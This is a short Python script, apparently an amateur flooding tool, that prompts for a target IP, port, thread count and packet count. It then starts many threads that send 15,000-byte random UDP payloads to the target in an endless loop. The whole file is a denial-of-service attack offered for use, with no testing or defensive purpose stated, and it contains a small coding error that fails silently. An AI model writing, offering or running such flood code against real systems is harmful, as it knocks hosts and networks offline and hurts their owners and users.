import socket
import threading
import random
print ("By : ibtisam jehkhong ><")
print("")
ip = input("Ip : ")
port = int(input("Port : "))
th = int(input("Thread : "))
pak = int(input("packate : "))
def tcp1():
	data = random._urandom(15000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.sendto(data,(ip,port))
			try:
				for i in range(pak):
					s.send(data,(ip,port))
				
				
			except:
				s.close()
		except:
				s.close()
									
print("Connect to ",ip)				
for i in range(th):
		threading.Thread(target=tcp1).start()
